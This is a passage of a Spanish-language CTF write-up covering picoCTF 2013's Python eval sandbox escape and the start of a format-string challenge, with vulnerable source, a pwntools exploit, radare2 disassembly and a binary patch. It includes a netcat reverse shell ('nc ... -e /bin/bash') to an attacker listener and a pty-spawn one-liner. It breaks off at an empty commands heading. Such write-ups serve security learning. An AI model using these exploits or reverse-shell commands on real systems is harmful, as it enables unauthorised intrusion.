<span style="color: #000080; font-weight: bold">del</span> __builtins__.__dict__[<span style="color: #0000FF">&#39;__import__&#39;</span>]
<span style="color: #000080; font-weight: bold">del</span> __builtins__.__dict__[<span style="color: #0000FF">&#39;reload&#39;</span>]

<span style="color: #000080; font-weight: bold">print</span> <span style="color: #0000FF">&quot;Welcome to the food menu!&quot;</span>
choices = (
  (<span style="color: #0000FF">&quot;Chicken Asada Burrito&quot;</span>, <span style="color: #0000FF">7.69</span>, <span style="color: #0000FF">&quot;caburrito.txt&quot;</span>),
  (<span style="color: #0000FF">&quot;Beef Chow Mein&quot;</span>, <span style="color: #0000FF">6.69</span>, <span style="color: #0000FF">&quot;beefchow.txt&quot;</span>),
  (<span style="color: #0000FF">&quot;MeatBurger Deluxe&quot;</span>, <span style="color: #0000FF">10.49</span>, <span style="color: #0000FF">&quot;no description&quot;</span>),
  <span style="color: #008800; font-style: italic"># ...</span>
)

<span style="color: #000080; font-weight: bold">def</span> print_description(n):
  <span style="color: #000080; font-weight: bold">print</span> <span style="color: #0000FF">&quot;&quot;</span>
  <span style="color: #000080; font-weight: bold">if</span> n &gt;= len(choices):
    <span style="color: #000080; font-weight: bold">print</span> <span style="color: #0000FF">&quot;No such item!&quot;</span>
  <span style="color: #000080; font-weight: bold">elif</span> <span style="font-weight: bold">not</span> path.exists(choices[n][<span style="color: #0000FF">2</span>]):
    <span style="color: #000080; font-weight: bold">print</span> <span style="color: #0000FF">&quot;No description yet, but we promise it&#39;s tasty!&quot;</span>
  <span style="color: #000080; font-weight: bold">else</span>:
    <span style="color: #000080; font-weight: bold">print</span> open(choices[n][<span style="color: #0000FF">2</span>]).read()

<span style="color: #000080; font-weight: bold">def</span> show_menu():
  <span style="color: #000080; font-weight: bold">for</span> i <span style="font-weight: bold">in</span> xrange(len(choices)):
    <span style="color: #000080; font-weight: bold">print</span> <span style="color: #0000FF">&quot;[% 2d] $% 3.2f %s&quot;</span> % (i, choices[i][<span style="color: #0000FF">1</span>], choices[i][<span style="color: #0000FF">0</span>])

<span style="color: #000080; font-weight: bold">while</span> True:
  <span style="color: #000080; font-weight: bold">print</span> <span style="color: #0000FF">&quot;Which description do you want to read?&quot;</span>
  show_menu()
  print_description(input(<span style="color: #0000FF">&#39;&gt; &#39;</span>))
</pre></div>
<h4>[Técnica]:</h4>
Referencia al módulo <code>OS</code> usando <code>path</code> y obtención de una shell.
<h4>[Informe]:</h4>
Sabiendo que en el script que ejecuta el servidor usa la función vulnerable <code>input</code> simplemente tenemos que hacer un exploit(ver:exploit) y tener un netcat a la escucha para recibir una shell reversa debido a que el socket no nos envia de vuelta el data. No podremos importar <code>OS</code> en nuestro exploit para ejecutar <code>/bin/bash</code> debido a que esta bloqueado y no será tan fácil llamar una shell, por tanto deberemos pensar en otro bypass. Viendo lo que importa <code>path</code> vemos que tiene una referencia a <code>OS</code> así que podremos ejecutar una shell!.
<p><em><strong>Obteniendo user shell</strong></em></p>
Tenemos un server que esta ejecutando el script en el puerto <code>4444</code>.
<pre><code>$ nc -lvp 4444 | python task5.py
listening on [any] 4444 ...
Welcome to the food menu!
Which description do you want to read?
[ 0] $ 7.69 Chicken Asada Burrito
[ 1] $ 6.69 Beef Chow Mein
[ 2] $ 10.49 MeatBurger Deluxe
192.168.32.142: inverse host lookup failed: Unknown host
connect to [192.168.32.129] from (UNKNOWN) [192.168.32.142] 39348
</code></pre>
En la máquina atacante ejecutamos el exploit (ver:exploit). Y seguidamente nos conectamos a nosotros mismos por el puerto donde esta escuchando nuestro listener.
<pre><code>naivenom@parrot:[~/pwn/python_eval] $ python exploit2.py 
[+] Opening connection to 192.168.32.129 on port 4444: Done
[*] Switching to interactive mode
$ nc 192.168.32.142 1234 -e /bin/bash
</code></pre>
Nuestro Netcat a la escucha.
<pre><code>naivenom@parrot:[~/fwr/dev] $ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.32.142] from (UNKNOWN) [192.168.32.129] 45560
id
uid=998(guille) gid=997(guille) grupos=997(guille)
python -c 'import pty; pty.spawn("/bin/bash")'
</code></pre>
<h4>[Exploit Development]:</h4>
<div style="background: #ffffff; overflow:auto;width:auto;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">from</span> pwn <span style="color: #000080; font-weight: bold">import</span> *

<span style="color: #000080; font-weight: bold">def</span> exploit(data):
    <span style="color: #000080; font-weight: bold">global</span> p
    p.sendline(data)

p = remote(<span style="color: #0000FF">&#39;192.168.32.129&#39;</span>, <span style="color: #0000FF">4444</span>)

exploit(<span style="color: #0000FF">&#39;path.os.system(&quot;/bin/bash&quot;)&#39;</span>)
p.interactive()
</pre></div>
<h4>[URL Reto]:</h4>
<a href="https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/python-eval-3">--PYTHON EVAL3 PICO CTF 2013--</a>
<h2><a id="format_uno" href="#format_uno">1. Format String. NX habilitado y Stack Canary.</a></h2>
<h4>[Resumen]:</h4>
Tenemos que explotar format string para obtener una shell. Código:
<div style="background: #ffffff; overflow:auto;width:auto;"><pre style="margin: 0; line-height: 125%"><span style="color: #008080">#undef _FORTIFY_SOURCE</span>
<span style="color: #008080">#include &lt;stdio.h&gt;</span>
<span style="color: #008080">#include &lt;unistd.h&gt;</span>
<span style="color: #008080">#include &lt;string.h&gt;</span>

<span style="color: #000080; font-weight: bold">int</span> x = <span style="color: #0000FF">3</span>;

<span style="color: #000080; font-weight: bold">void</span> be_nice_to_people() {
    <span style="color: #008800; font-style: italic">// /bin/sh is usually symlinked to bash, which usually drops privs. Make</span>
    <span style="color: #008800; font-style: italic">// sure we don&#39;t drop privs if we exec bash, (ie if we call system()).</span>
    <span style="color: #000080; font-weight: bold">gid_t</span> gid = getegid();
    setresgid(gid, gid, gid);
}

<span style="color: #000080; font-weight: bold">int</span> main(<span style="color: #000080; font-weight: bold">int</span> argc, <span style="color: #000080; font-weight: bold">const</span> <span style="color: #000080; font-weight: bold">char</span> **argv) {
    be_nice_to_people();
    <span style="color: #000080; font-weight: bold">char</span> buf[<span style="color: #0000FF">80</span>];
    bzero(buf, <span style="color: #000080; font-weight: bold">sizeof</span>(buf));
    <span style="color: #000080; font-weight: bold">int</span> k = read(STDIN_FILENO, buf, <span style="color: #0000FF">80</span>);
    printf(buf);
    printf(<span style="color: #0000FF">&quot;%d!\n&quot;</span>, x); 
    <span style="color: #000080; font-weight: bold">if</span> (x == <span style="color: #0000FF">4</span>) {
        printf(<span style="color: #0000FF">&quot;running sh...\n&quot;</span>);
        system(<span style="color: #0000FF">&quot;/bin/sh&quot;</span>);
    }
    <span style="color: #000080; font-weight: bold">return</span> <span style="color: #0000FF">0</span>;
}
</pre></div>
<h4>[Técnica]:</h4>
Format string.
<h4>[Informe]:</h4>
<p><em><strong>Recolección de información</strong></em></p>
Primero debemos obtener toda la información posible del binario así que debemos realizar reversing y ver alguna vulnerabilidad en el desensamblado. Usando radare2 observamos que tenemos un buffer de 80 bytes y si queremos obtener una shell debemos hacer cumplir el salto condicional <code>jne</code>y que la variable <code>dword obj.x</code> sea igual a 4 para obtener <code>/bin/bash</code>.
<pre><code>0x08048586      c74424085000.  mov dword [local_8h], 0x50  ; 'P' ; [0x50:4]=-1 ; 80
|           0x0804858e      8d44242c       lea eax, dword [local_2ch]  ; 0x2c ; ',' ; 44
|           0x08048592      89442404       mov dword [local_4h], eax
|           0x08048596      c70424000000.  mov dword [esp], 0
|           0x0804859d      e83efeffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x080485a2      89442428       mov dword [local_28h], eax
|           0x080485a6      8d44242c       lea eax, dword [local_2ch]  ; 0x2c ; ',' ; 44
|           0x080485aa      890424         mov dword [esp], eax
|           0x080485ad      e83efeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x080485b2      8b152ca00408   mov edx, dword obj.x        ; [0x804a02c:4]=3
|           0x080485b8      b8e0860408     mov eax, str.d              ; 0x80486e0 ; "%d!\n"
|           0x080485bd      89542404       mov dword [local_4h], edx
|           0x080485c1      890424         mov dword [esp], eax
|           0x080485c4      e827feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x080485c9      a12ca00408     mov eax, dword obj.x        ; [0x804a02c:4]=3
|           0x080485ce      83f804         cmp eax, 4                  ; 4
|       ,=< 0x080485d1      7518           jne 0x80485eb
|       |   0x080485d3      c70424e58604.  mov dword [esp], str.running_sh... ; [0x80486e5:4]=0x6e6e7572 ; "running sh..."
|       |   0x080485da      e841feffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x080485df      c70424f38604.  mov dword [esp], str.bin_sh ; [0x80486f3:4]=0x6e69622f ; "/bin/sh"
|       |   0x080485e6      e845feffff     call sym.imp.system         ; int system(const char *string)
</code></pre>
Otra solución sería parchear el binario y en la instrucción <code>cmp eax, 4</code> cambiar el 4 por el 3.
<pre><code>[0x0804854d]> s 0x080485ce
[0x080485ce]> wa cmp eax, 3
Written 3 byte(s) (cmp eax, 3) = wx 83f803
</code></pre>
Lo ejecutamos y tenemos shell.
<pre><code>naivenom@parrot:[~/pwn/format1] $ ./patch 
id
id
3!
running sh...id
uid=1000(naivenom) gid=1000(naivenom) grupos=1000(naivenom),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),106(netdev),111(debian-tor),121(bluetooth),132(scanner)
</code></pre>
Pero vamos a explotar el binario sin necesidad de modificarlo, debido a que en la función <code>printf(buf)</code> no existe ningún formato de cadena<code>%s</code> como por ejemplo en la siguiente llamada a la misma función por lo tanto tenemos total control de volcar algún contenido en memoria.

<h4>[Comandos]:</h4>
